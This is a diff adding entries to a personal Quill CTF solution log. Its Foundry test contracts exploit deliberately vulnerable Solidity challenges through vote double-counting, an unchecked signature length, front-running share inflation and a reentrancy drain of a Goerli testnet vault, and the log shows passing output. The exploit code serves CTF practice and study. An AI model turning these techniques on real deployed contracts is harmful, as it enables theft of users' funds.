@@ -979,4 +979,277 @@ contract WETH10Exploit{
         weth.withdrawAll();
 ```
 
+### 2024.09.15
+
+- Quill CTF: TrueXOR
+- Quill CTF: VoteToken
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/TrueXOR.sol";
+
+
+contract TrueXORTest is Test {
+    TrueXOR public txor;
+    address bob;
+
+    function setUp() public {
+        txor = new TrueXOR();
+        bob = address(1);
+    }
+
+    function testHack() public {
+        TrueXORExploit te = new TrueXORExploit();
+        vm.startPrank(bob, bob);
+        txor.ctf(address(te));
+        vm.stopPrank();
+    }
+}
+
+contract TrueXORExploit is IBoolGiver {
+
+  function giveBool() external view override returns (bool) {
+    uint256 g = gasleft();
+    if(g%2 == 1)
+        return true;
+    else
+        return false;
+  }
+
+}
+```
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.12;
+
+import "forge-std/Test.sol";
+import "../src/VoteToken.sol";
+
+contract VoteTokenTest is Test {
+	VoteToken vToken;
+	address public owner = address(0);
+	address public hacker =address(1337);
+
+	address public alice= address(1);
+	address public bob = address(2);
+	address public carl = address(3);
+
+	function setUp() public {
+		vm.startPrank(owner);
+		vToken = new VoteToken();
+		vToken.mint(alice, 1000);
+		vm.stopPrank();
+  }
+	
+	function testExploit() public {
+    vm.startPrank(alice);
+    vToken.delegate(hacker);
+    vToken.transfer(bob, 1000);
+    vm.stopPrank();
+    vm.startPrank(bob);
+    vToken.delegate(hacker);
+    vToken.transfer(carl, 1000);
+    vm.stopPrank();
+    vm.startPrank(carl);
+    vToken.delegate(hacker);
+    vToken.transfer(hacker, 1000);            
+    vm.stopPrank();
+
+		uint hacker_vote = vToken.getVotes(hacker);
+    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);
+
+		uint hacker_balance= vToken.balanceOf(hacker);
+    console.log("Hacker's vToken after the attack: %s: ", hacker_balance);
+
+		assertEq(hacker_vote , 3000);
+		assertEq(hacker_balance, 1000);
+	}
+}
+```
+
+### 2024.09.16
+
+- Quill CTF: PandaToken
+
+#### PandaToken
+check layout:
+```
+➜  test-quill git:(main) ✗ forge inspect ./src/pandaToken.sol:PandaToken storage-layout --pretty
+| Name           | Type                                            | Slot | Offset | Bytes | Contract                      |
+|----------------|-------------------------------------------------|------|--------|-------|-------------------------------|
+| _balances      | mapping(address => uint256)                     | 0    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _allowances    | mapping(address => mapping(address => uint256)) | 1    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _totalSupply   | uint256                                         | 2    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _name          | string                                          | 3    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _symbol        | string                                          | 4    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| _owner         | address                                         | 5    | 0      | 20    | src/pandaToken.sol:PandaToken |
+| c1             | uint256                                         | 6    | 0      | 32    | src/pandaToken.sol:PandaToken |*
+| usedSignatures | mapping(bytes => bool)                          | 7    | 0      | 32    | src/pandaToken.sol:PandaToken |
+| burnPending    | mapping(address => uint256)                     | 8    | 0      | 32    | src/pandaToken.sol:PandaToken |
+```
+
+calculateAmount = (input * 1000) / (599 + 1 + c1) => c1 = 400 => calculateAmount = input
+
+The contract is little misleading since the root cause is the signature **don't** have a length check, and when decoding from bytes, it will only take care about the first 65.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+import "../src/pandaToken.sol";
+
+contract PandaTokenHack is Test {
+    PandaToken pandatoken;
+    address owner = vm.addr(1);
+    address hacker = vm.addr(2);
+
+    function setUp() external {
+        vm.prank(owner);
+        pandatoken = new PandaToken(400, "PandaToken", "PND");
+    }
+
+    function test() public {
+        vm.startPrank(hacker);
+        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
+
+        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
+        // solution
+        pandatoken.balanceOf(owner);
+        pandatoken.balanceOf(hacker);
+
+        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v));
+        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes32(hex"1111")));
+        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes32(hex"2222")));
+       
+
+        assertEq(pandatoken.balanceOf(hacker), 3 ether);
+    }
+}
+```
+
+### 2024.09.17
+
+- Quill CTF: InvestPool
+
+ref: https://github.com/Kaiziron/quill-ctf-writeup/blob/main/invest-pool.md
+
+
+```solidity
+    function test_hack() public {
+        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
+		vm.startPrank(hacker);
+
+        // solution
+        string memory pass = 'j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx';
+        pool.initialize(pass);
+
+        // front run
+        pool.deposit(1);
+        token.transfer(address(pool), 500e18);
+
+        vm.stopPrank();
+        userDeposit(1000e18);
+        vm.startPrank(hacker);
+
+        console.log("Hacker pool share balance :", pool.balance(hacker));
+        console.log("User pool share balance :", pool.balance(user));
+        console.log("investPool token balance :",token.balanceOf(address(pool)));
+        console.log("Hacker token balance :", token.balanceOf(hacker));
+
+        pool.withdrawAll();
+        
+        console.log("Hacker pool share balance :", pool.balance(hacker));
+        console.log("User pool share balance :", pool.balance(user));
+        console.log("investPool token balance :",token.balanceOf(address(pool)));
+
+
+		vm.stopPrank();
+        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
+    }
+```
+
+### 2024.09.16
+
+- Quill CTF: MolochVault
+
+```solidity
+        require(hsah == keccak256(abi.encode(_openSecrete[0])) && msg.value < 3 gwei, "success"); // molochPass
+        require(hy7UIH == keccak256(abi.encodePacked(_openSecrete[1],_openSecrete[2])), "Hahahaha!!"); // keccak256(abi.encodePacked(_b[0],_b[1]))
+        require(keccak256(abi.encode(_openSecrete[1])) != keccak256(abi.encode(question[0])),"grant awarded!!"); // split the _openSecrete[1],_openSecrete[2]
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+import "../src/moloch_vault.sol";
+
+
+contract Hack is Test {
+    MOLOCH_VAULT molochVault;
+    MolochVaultExploit molochVaultExploit;
+    uint256 startBalance;
+    address hacker = vm.addr(2);
+
+    function setUp() external {
+        molochVault = MOLOCH_VAULT(payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f));
+        startBalance = address(molochVault).balance;
+        console.log("Starting balance : ", startBalance);
+        
+        vm.prank(hacker);
+        molochVaultExploit = new MolochVaultExploit();
+        vm.deal(hacker, 1 ether);
+    }
+
+    function test() public {
+        vm.startPrank(hacker);
+        molochVaultExploit.exploit{value: 2 wei}(address(molochVault));
+        
+        console.log("Balance after exploit : ", address(molochVault).balance);
+        assertLt(address(molochVault).balance, startBalance);
+    }
+}
+
+
+pragma solidity ^0.8.7;
+
+contract MolochVaultExploit {
+    uint256 counter = 0;
+    
+    function exploit(address molochVault) public payable {
+        MOLOCH_VAULT(payable(molochVault)).uhER778(["BLOODY PHARMACIST", "WHO DO YOUS", "ERVE?"]);
+        // send grant will give us 1 wei
+        MOLOCH_VAULT(payable(molochVault)).sendGrant(payable(address(this)));
+        MOLOCH_VAULT(payable(molochVault)).sendGrant(payable(address(this)));
+    }
+    
+    receive() external payable {
+        if (counter == 0) {
+            counter += 1;
+            payable(msg.sender).transfer(2 wei);
+        }
+    }
+}
+```
+
+```bash
+forge test --match-path test/moloch.t.sol -vv --fork-url https://eth-goerli.public.blastapi.io
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/moloch.t.sol:Hack
+[PASS] test() (gas: 114266)
+Logs:
+  Starting balance :  9999999999999928
+  Balance after exploit :  9999999999999927
+
+```
+
 <!-- Content_END -->
